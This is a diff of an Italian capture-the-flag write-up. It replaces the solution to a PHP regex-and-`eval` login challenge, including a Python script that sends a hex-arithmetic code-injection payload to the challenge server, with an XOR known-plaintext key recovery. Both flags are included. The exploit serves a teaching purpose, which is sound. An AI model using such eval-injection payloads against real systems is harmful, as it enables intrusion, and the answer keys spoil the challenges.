@@ -1,74 +1,34 @@
 # Intrusione Virtuale
 
 ## Descrizione
-Salve futuro Hacker di élite! Se pensavi di poter entrare nel nostro esclusivo club segreto senza passare attraverso il fuoco delle nostre Regex difensive, 
-ti sei sbagliato di grosso! Abbiamo preparato per te una sfida di registrazione all'avanguardia, e le nostre Regex sono più taglienti di un codice malevolo.
-
-Riuscirai a superare le barriere cibernetiche e a infiltrarti nel nostro sistema con stile da vero hacker? 
-Solo coloro che padroneggiano l'arte delle Regex potranno ottenere il titolo di "Intruso Supremo"!
+Benvenuto nel mondo cifrato di XOR! La tua missione è esplorare le profondità di questa dimensione crittografica e scoprire la chiave segreta utilizzata per cifrare il flag. 
+Hai l'abilità e l'ingegno necessari per navigare attraverso xor-world?
 
 Per ottenere il titolo di 'Intruso Supremo' visita la pagina: [http://www.beginner.havce.it:8080](http://www.beginner.havce.it:8080).
-
-HINT: Utilizzare la rappresentazione esadecimale potrebbe esserti d'aiuto.
 
 *Author: [@benjamin](https://github.com/b3nj4m1no)*
 
 
 ## Soluzione
-Come affermato nella descrizione, il primo obiettivo era superare le REGEX.
+Come affermato nella descrizione, l'obiettivo era trovare la key utilizzata nello XOR.
+Sfruttando la proprietà principale dello XOR ( A ^ B = C --> C ^ B = A ) avendo il `ciphertext` e la `key`, potevamo risalire al `plaintext` ( la flag ).
 
+Per trovare la key, potevamo sfruttare il flag format ( `codevinci{` ).
+```
+Il ciphertext e': b'\x01\n\n\x0f\x17\x04\x07\r\x0b\x1e\x08\x06\x00\n6\x08\r\x17\x03\x0b\x152\x05\x0b\x03\x0e1\x03\x122\x1a\x01=\x06\x01\x05\r2\x05\x07\t\x001\x18\x14\n\x06\x02\rD\x13'
+Inserisci la chiave in ASCII: codevinci{
+Il plaintext e': b'benjaminbekido@actjpv]anug_`{IynYcwlcQl|joU}bchad?p'
+```
+Come si poteva notare, la key restituita era benjamin...
 
-La prima REGEX controlla se la password contiene caratteri non compresi nella funzione `preg_match`, per esempio lo spazio ( ).
-```php
-if (!preg_match("/^[a-zA-Z0-9_\-'(),]+$/", $inp, $matches))
+Proviamo ad inserire `benjamin` come chiave...
+```
+Il ciphertext e': b'\x01\n\n\x0f\x17\x04\x07\r\x0b\x1e\x08\x06\x00\n6\x08\r\x17\x03\x0b\x152\x05\x0b\x03\x0e1\x03\x122\x1a\x01=\x06\x01\x05\r2\x05\x07\t\x001\x18\x14\n\x06\x02\rD\x13'
+Inserisci la chiave in ASCII: benjamin
+Il plaintext e': b'codevinci{flag_format_leak_is_so_cool_like_rugolo!}'
 ```
 
-La seconda REGEX:
-- Controlla se la stringa contiene almeno un numero.
-- Controlla se la stringa contiene almeno una lettera.
-- Controlla se la stringa contiene almeno uno degli underscore ( _ ) o dei trattini ( - ).
-```php
-if (!(preg_match("/[0-9]/", $inp, $matches) && preg_match("/[a-zA-Z]/", $inp, $matches) && preg_match("/[_-]/", $inp, $matches)))
-```
-
-La terza REGEX controlla se la password contiene il numero "1".
-```php
-if (preg_match("/[1]/", $inp, $matches))
-```
-
-
-Arrivati a questo punto dobbiamo porci un altro obiettivo, quello di superare l'ultimo controllo.
-```php
-if ($inp != "192014812")
-```
-
-Ovviamente visto che la stringa contiene il numero "1", la password "192014812" non è valida.
-Osservando il codice però, possiamo osservare che prima di `strcmp` viene eseguita la funzione [`eval`](https://www.php.net/manual/en/function.eval.php).
-```php
-eval("\$input=$inp;");
-```
-Grazie al funzionamento interno della funzione `eval`, possiamo usarla a nostro favore, passando come parametro "192014812" codificato, per esempio in esadecimale.
-Ricordiamoci che non possiamo passare direttamente il numero codificato, ma possiamo per esempio passare `192014822 - 10`.
-
-```py
-# Author: @benjamin
-
-import requests
-
-url = "http://www.beginner.havce.it:8080"
-
-# 192145884 --> numero più grande --> hex(192145884) = 0xb73e9dc
-# 192014812 --> numero
-# 131072    --> differenza --> hex(131072) = 0x20000
-
-payload = {
-    "password": "0xb73e9dc-0x20000"
-}
-
-r = requests.post(url, data=payload)
-
-print(r.text)
-```
+Oh let's go, andiamo a submittare la flag.
 
 ## Flag
-havceCTF{m4l3det7o_3va1}
+codevinci{flag_format_leak_is_so_cool_like_rugolo!}
